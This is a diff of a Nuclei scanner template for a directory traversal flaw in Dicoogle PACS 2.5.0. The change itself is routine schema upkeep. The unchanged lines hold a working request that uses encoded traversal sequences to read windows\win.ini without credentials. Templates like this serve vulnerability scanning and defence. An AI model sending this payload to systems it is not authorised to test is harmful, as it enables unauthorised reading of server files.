@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: dicoogle-pacs-lfi
 info:
   name: Dicoogle PACS 2.5.0 - Directory Traversal
@@ -6,7 +7,7 @@ info:
   description: In version 2.5.0, it is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required.
   reference: https://cxsecurity.com/issue/WLB-2018070131
   tags: windows,lfi,dicoogle
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
